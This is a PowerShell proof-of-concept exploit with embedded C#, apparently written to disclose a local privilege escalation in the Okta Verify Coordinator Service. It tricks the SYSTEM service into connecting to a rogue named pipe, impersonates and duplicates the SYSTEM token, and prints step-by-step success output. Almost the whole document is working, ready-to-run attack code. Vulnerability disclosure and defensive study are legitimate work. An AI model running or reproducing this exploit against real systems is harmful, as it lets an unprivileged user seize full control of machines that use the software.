# Okta Coordinator Service - Named Pipe Impersonation LPE PoC
# Author: Lucid_Duck
# Date: 2026-03-06
#
# VULNERABILITY: The Okta Coordinator Service (NT AUTHORITY\SYSTEM) accepts
# a user-controlled "PipeName" field in IPCMessages. When set, the SYSTEM
# service connects BACK to that pipe as a client to send notifications.
# A standard user can create a pipe server, trigger the callback, and
# impersonate the SYSTEM token via ImpersonateNamedPipeClient().
#
# REQUIREMENTS: Standard (non-admin) user, Okta Verify installed
# TESTED ON: Okta Verify 6.7.1.0, Windows 11 Pro 10.0.26200

param(
    [switch]$Check,    # Just verify the pipe exists and is accessible
    [switch]$Exploit,  # Run the full impersonation attack
    [switch]$Cleanup   # Nothing to clean up (no files planted)
)

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

public class OktaPipeExploit
{
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(
        IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel,
        int TokenType, out IntPtr phNewToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint TOKEN_ALL_ACCESS = 0xF01FF;
    const int SecurityImpersonation = 2;
    const int TokenPrimary = 1;

    public static string CheckPipe()
    {
        try
        {
            using (var client = new NamedPipeClientStream(".", "Okta.Coordinator.pipe", PipeDirection.InOut))
            {
                client.Connect(3000);
                return "SUCCESS: Connected to Okta.Coordinator.pipe as current user";
            }
        }
        catch (TimeoutException)
        {
            return "TIMEOUT: Pipe exists but no server listening (service may be busy)";
        }
        catch (Exception ex)
        {
            return "FAILED: " + ex.GetType().Name + ": " + ex.Message;
        }
    }

    public static string Exploit(string markerPath)
    {
        string roguePipeName = "Okta.LPE." + Guid.NewGuid().ToString("N").Substring(0, 8);
        string result = "";
        bool gotSystem = false;

        // Step 1: Create rogue pipe server
        result += "[*] Creating rogue pipe server: " + roguePipeName + "\n";

        var serverReady = new ManualResetEvent(false);
        var exploitDone = new ManualResetEvent(false);

        var serverThread = new Thread(() =>
        {
            try
            {
                PipeSecurity ps = new PipeSecurity();
                ps.AddAccessRule(new PipeAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                    PipeAccessRights.FullControl,
                    AccessControlType.Allow));

                using (var server = new NamedPipeServerStream(
                    roguePipeName,
                    PipeDirection.InOut,
                    1,
                    PipeTransmissionMode.Byte,
                    PipeOptions.None,
                    4096, 4096, ps))
                {
                    result += "[*] Rogue pipe server listening\n";
                    serverReady.Set();

                    server.WaitForConnection();
                    result += "[+] GOT CONNECTION on rogue pipe!\n";

                    // Read the notification data
                    byte[] buf = new byte[8192];
                    int bytesRead = 0;
                    try
                    {
                        bytesRead = server.Read(buf, 0, buf.Length);
                        string received = System.Text.Encoding.UTF8.GetString(buf, 0, bytesRead);
                        result += "[+] Received " + bytesRead + " bytes from SYSTEM service\n";
                        if (received.Length > 200)
                            received = received.Substring(0, 200) + "...";
                        result += "[+] Data: " + received + "\n";
                    }
                    catch (Exception) { }

                    // Step 3: IMPERSONATE the connected client (SYSTEM)
                    IntPtr pipeHandle = server.SafePipeHandle.DangerousGetHandle();
                    if (!ImpersonateNamedPipeClient(pipeHandle))
                    {
                        int err = Marshal.GetLastWin32Error();
                        result += "[-] ImpersonateNamedPipeClient failed: Win32 error " + err + "\n";
                        exploitDone.Set();
                        return;
                    }

                    var identity = WindowsIdentity.GetCurrent();
                    result += "[+] IMPERSONATING: " + identity.Name + "\n";
                    result += "[+] IsSystem: " + identity.IsSystem + "\n";

                    if (identity.Name.IndexOf("SYSTEM", StringComparison.OrdinalIgnoreCase) >= 0 || identity.IsSystem)
                    {
                        gotSystem = true;
                        result += "\n[!!!] ===== NT AUTHORITY\\SYSTEM TOKEN OBTAINED ===== [!!!]\n\n";

                        // Write proof file as SYSTEM
                        try
                        {
                            string proof = "Okta Verify Pipe Impersonation LPE PoC\r\n";
                            proof += "Timestamp: " + DateTime.UtcNow.ToString("o") + "\r\n";
                            proof += "Impersonated Identity: " + identity.Name + "\r\n";
                            proof += "IsSystem: " + identity.IsSystem + "\r\n";
                            proof += "Exploit: Named pipe impersonation via Okta.Coordinator.pipe PipeName callback\r\n";
                            proof += "Pipe: " + roguePipeName + "\r\n";
                            File.WriteAllText(markerPath, proof);
                            result += "[+] Wrote SYSTEM proof marker: " + markerPath + "\n";
                        }
                        catch (Exception ex)
                        {
                            result += "[*] Marker write note: " + ex.Message + "\n";
                        }

                        // Duplicate token for demonstration
                        IntPtr threadToken;
                        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out threadToken))
                        {
                            IntPtr primaryToken;
                            if (DuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, IntPtr.Zero,
                                SecurityImpersonation, TokenPrimary, out primaryToken))
                            {
                                result += "[+] Duplicated primary SYSTEM token (handle: 0x" + primaryToken.ToString("X") + ")\n";
                                result += "[+] This token can be used with CreateProcessWithTokenW for SYSTEM shell\n";
                                CloseHandle(primaryToken);
                            }
                            CloseHandle(threadToken);
                        }
                    }
                    else
                    {
                        result += "[*] Impersonation returned identity: " + identity.Name + " (not SYSTEM)\n";
                    }

                    RevertToSelf();
                }
            }
            catch (Exception ex)
            {
                result += "[-] Server thread error: " + ex.GetType().Name + ": " + ex.Message + "\n";
            }
            finally
            {
                exploitDone.Set();
            }
        });

        serverThread.IsBackground = true;
        serverThread.Start();

        // Wait for server to be ready
        serverReady.WaitOne(5000);
        Thread.Sleep(200);

        // Step 2: Send trigger message to Okta.Coordinator.pipe
        result += "[*] Sending trigger IPCMessage to Okta.Coordinator.pipe...\n";
        result += "[*] PipeName field set to: " + roguePipeName + "\n";
        try
        {
            string json = "{" +
                "\"ArtifactType\":\"OktaVerify\"," +
                "\"AutoUpdateUrl\":\"https://trial-3887003.okta.com\"," +
                "\"BucketId\":\"1\"," +
                "\"CurrentInstalledVersion\":{\"_Build\":0,\"_Major\":1,\"_Minor\":0,\"_Revision\":0}," +
                "\"EventLogName\":\"Okta Verify\"," +
                "\"EventSourceName\":\"OktaUpdate\"," +
                "\"PipeName\":\"" + roguePipeName + "\"," +
                "\"ReleaseChannel\":\"GA\"," +
                "\"UserId\":null}";

            using (var trigger = new NamedPipeClientStream(".", "Okta.Coordinator.pipe", PipeDirection.InOut))
            {
                trigger.Connect(5000);
                byte[] data = System.Text.Encoding.UTF8.GetBytes(json);
                trigger.Write(data, 0, data.Length);
                trigger.Flush();
                result += "[+] Trigger message sent successfully\n";
            }
        }
        catch (Exception ex)
        {
            result += "[-] Failed to send trigger: " + ex.GetType().Name + ": " + ex.Message + "\n";
            exploitDone.Set();
            return result;
        }

        // Wait for SYSTEM callback (up to 30 seconds)
        result += "[*] Waiting for SYSTEM callback (up to 30s)...\n";
        exploitDone.WaitOne(30000);

        if (gotSystem)
        {
            result += "\n========================================\n";
            result += "  EXPLOITATION SUCCESSFUL\n";
            result += "  NT AUTHORITY\\SYSTEM token obtained\n";
            result += "  from standard user account\n";
            result += "========================================\n";
        }
        else if (!exploitDone.WaitOne(0))
        {
            result += "\n[-] Timed out. Service may not be running or URL validation blocked the request.\n";
        }
        else
        {
            result += "\n[-] Callback received but did not yield SYSTEM token.\n";
        }

        return result;
    }
}
"@

# --- Main ---

$ErrorActionPreference = "Stop"

if ($Check) {
    Write-Host "=== Okta Pipe Impersonation LPE - CHECK MODE ==="
    Write-Host ""

    # Current user
    Write-Host "[*] Current user: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Host "[*] Is admin: $isAdmin (exploit works as standard user too)"
    Write-Host ""

    # Service check
    $svc = Get-Service -Name "OktaCoordinatorService" -ErrorAction SilentlyContinue
    if (-not $svc) {
        # Try alternate name
        $svc = Get-Service -DisplayName "*Okta*Coordinator*" -ErrorAction SilentlyContinue
    }
    if (-not $svc) {
        $svc = Get-Service -DisplayName "*Okta*Update*" -ErrorAction SilentlyContinue
    }
    if ($svc) {
        Write-Host "[+] Service found: $($svc.Name) ($($svc.DisplayName))"
        Write-Host "[+] Status: $($svc.Status)"
        $svcInfo = Get-WmiObject Win32_Service -Filter "Name='$($svc.Name)'" -ErrorAction SilentlyContinue
        if ($svcInfo) {
            Write-Host "[+] Runs as: $($svcInfo.StartName)"
        }
    } else {
        Write-Host "[-] Okta Coordinator Service not found on this machine"
        Write-Host "    (Run this on a machine with Okta Verify installed)"
    }
    Write-Host ""

    # Pipe connectivity
    Write-Host "[*] Testing pipe connectivity..."
    $pipeResult = [OktaPipeExploit]::CheckPipe()
    Write-Host "[*] Result: $pipeResult"
    Write-Host ""

    # Check for Okta install
    $oktaPath = "C:\Program Files\Okta\UpdateService\Okta.Coordinator.Service.exe"
    if (Test-Path $oktaPath) {
        $ver = (Get-Item $oktaPath).VersionInfo.FileVersion
        Write-Host "[+] Coordinator Service binary: $oktaPath"
        Write-Host "[+] Version: $ver"
    } else {
        Write-Host "[-] Coordinator Service binary not found at expected path"
    }
}
elseif ($Exploit) {
    Write-Host "=== Okta Pipe Impersonation LPE - EXPLOIT MODE ==="
    Write-Host ""
    Write-Host "[*] Current user: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    Write-Host "[*] Attack flow:"
    Write-Host "    1. Create rogue named pipe server"
    Write-Host "    2. Send IPCMessage to Okta.Coordinator.pipe with PipeName = rogue pipe"
    Write-Host "    3. SYSTEM service processes message, connects back to our pipe"
    Write-Host "    4. Call ImpersonateNamedPipeClient() to steal SYSTEM token"
    Write-Host ""

    $markerPath = "$env:ProgramData\Okta\PIPE-LPE-PROOF.txt"
    $output = [OktaPipeExploit]::Exploit($markerPath)
    Write-Host $output

    if (Test-Path $markerPath) {
        Write-Host ""
        Write-Host "=== PROOF MARKER CONTENTS ==="
        Get-Content $markerPath
    }
}
elseif ($Cleanup) {
    Write-Host "=== Cleanup ==="
    $markerPath = "$env:ProgramData\Okta\PIPE-LPE-PROOF.txt"
    if (Test-Path $markerPath) {
        Remove-Item $markerPath -Force
        Write-Host "[+] Removed $markerPath"
    } else {
        Write-Host "[*] Nothing to clean up"
    }
}
else {
    Write-Host "Usage: okta-pipe-impersonation-poc.ps1 -Check | -Exploit | -Cleanup"
    Write-Host ""
    Write-Host "  -Check    Verify prerequisites (service running, pipe accessible)"
    Write-Host "  -Exploit  Run the pipe impersonation attack"
    Write-Host "  -Cleanup  Remove proof marker file"
    Write-Host ""
    Write-Host "VULNERABILITY SUMMARY:"
    Write-Host "  The Okta Coordinator Service (SYSTEM) accepts a PipeName field in"
    Write-Host "  IPC messages. It then connects BACK to that pipe as a client to"
    Write-Host "  send status notifications. An attacker creates a pipe server first,"
    Write-Host "  sends the trigger message, and impersonates the SYSTEM token when"
    Write-Host "  the service connects. No files need to be planted on disk. No race"
    Write-Host "  condition. Deterministic, instant SYSTEM."
}
